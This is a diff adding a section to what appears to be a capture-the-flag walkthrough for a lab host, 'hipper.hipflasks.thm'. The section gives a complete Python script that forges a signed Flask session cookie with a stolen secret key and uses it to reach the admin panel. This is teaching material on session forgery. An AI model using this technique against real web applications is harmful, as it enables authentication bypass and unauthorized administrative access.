@@ -553,6 +553,134 @@ We now have everything we need, so let's forge some cookies!
 
 ## Task 15
 
+### Web App Cookie Forgery
+
+There are many ways to forge a Flask cookie -- most involve diving down into the internals of the Flask module to use the session handler directly: a very complicated solution to what is actually an incredibly simple problem.
+
+We need to generate Flask cookie. What better way to do that than with a Flask app?
+
+In short, we are going to write our own (very simple) Flask app which will take the secret key we "borrowed" and use it to generate a signed session cookie with, well, basically whatever we want in it.
+
+Before we start writing, let's create a Python Virtual Environment for our project. A virtual environment (or venv) allows us to install dependencies for a project without running the risk of breaking anything else.
+
+Make sure that we have the requisite dependencies installed:
+```sudo apt update && sudo apt install python3-venv```
+
+Now we can create the virtual environment:
+```python3 -m venv poc-venv```
+
+This will create a subdirectory called ```poc-venv``` containing our virtual environment.
+We can activate this using the command: ```source poc-venv/bin/activate```.
+
+This should change your prompt to indicate that we are now in the virtual environment:
+
+![image](https://user-images.githubusercontent.com/5285547/132736832-cabddc58-5475-46b8-977c-b685a6b70d17.png)
+
+When we are done using our program, we can use ```deactivate``` to leave the virtual environment.
+
+---
+
+Let's start our PoC by installing dependencies:
+```pip3 install flask requests waitress```
+
+Waitress isn't actually required here, but using it is very simple and makes the output of this code much cleaner, so we might as well add it in.
+
+Next we need to open a blank text document and start a new Python script:
+
+```python3
+#!/usr/bin/env python3
+from flask import Flask, session, request
+from waitress import serve
+import requests, threading, time
+```
+
+This gives us a Python script with a variety of modules. We have everything we need to set up a Flask app via the flask and waitress modules; then we also have requests, threading, and time, which we will use to automatically query the server we are setting up.
+
+With the imports sorted, let's initialise the app:
+
+```
+app = Flask(__name__)
+app.config["SECRET_KEY"] = "PUT_THE_KEY_HERE"
+```
+
+This creates a new Flask app object and configures the secret key. You will obviously have to substitute in the key you found earlier in the disclosed main.py file, replacing the "PUT_THE_KEY_HERE" text.
+
+Next let's configure a webroot which will set the two session values we identified earlier:
+
+```
+@app.route("/")
+def main():
+    session["auth"] = "True"
+    session["username"] = "Pentester"
+    return "Check your cookies", 200
+```
+
+Our app is now ready to go, we just need to start it and query it.
+
+We could technically just start the app here and navigate to it in our browser, but that would be boring. Let's do this all from the command line.
+
+If we are doing two things at once (starting the app, then sending a request to it), we will need to use threading, thus our next lines of code are:
+
+```
+thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
+thread.setDaemon(True)
+thread.start()
+```
+
+This creates a thread and gives it the job of starting waitress using our app object on ```localhost:9000```. It then tells the thread to daemonise, meaning it won't prevent the program from exiting (i.e. if the program exits then the server will also stop, but the program won't wait for the server to stop before exiting). Finally we start the thread, making the server run in the background.
+
+The last thing we need this program to do is query the server:
+
+```
+time.sleep(1)
+print(requests.get("http://localhost:9000/").cookies.get("session"))
+```
+
+This will wait for one second to give waitress enough time to start the server, then it will query the endpoint that we setup, making Flask generate and provide us with a cookie which the program will then print out. The program then ends, stopping the server automatically.
+
+We are now ready to go!
+
+The final program should look like this, albeit with your own key substituted in:
+
+```python3 
+#!/usr/bin/env python3
+from flask import Flask, session, request
+from waitress import serve
+import requests, threading, time
+
+#Flask Initialisation
+app = Flask(__name__)
+app.config["SECRET_KEY"] = "70a5411082ea8e48cc9e7f7d7c12f2c2"
+
+@app.route("/")
+def main():
+    session["auth"] = "True"
+    session["username"] = "Pentester"
+    return "Check your cookies", 200
+
+#Flask setup/start
+thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
+thread.setDaemon(True)
+thread.start()
+
+#Request
+time.sleep(1)
+print(requests.get("http://localhost:9000/").cookies.get("session"))
+```
+
+Running the program should give us a cookie signed by the server using our stolen key:
+
+![image](https://user-images.githubusercontent.com/5285547/132737238-a39b7cb5-d52c-4324-a121-c24e7fb750d6.png)
+
+This will be different every time the program is run.
+
+Now let's finish this. Copy the generated cookie, open your browser dev tools on the website, and overwrite the value of your current session cookie. This can also be done using a browser extension such as Cookie-Editor.
+
+We should now be able to access ```https://hipper.hipflasks.thm/admin```
+
+![image](https://user-images.githubusercontent.com/5285547/132737354-910c01d9-5b27-42dc-b85b-9c5b4196ef6a.png)
+
+
 ## Task 16
 
 ## Task 17
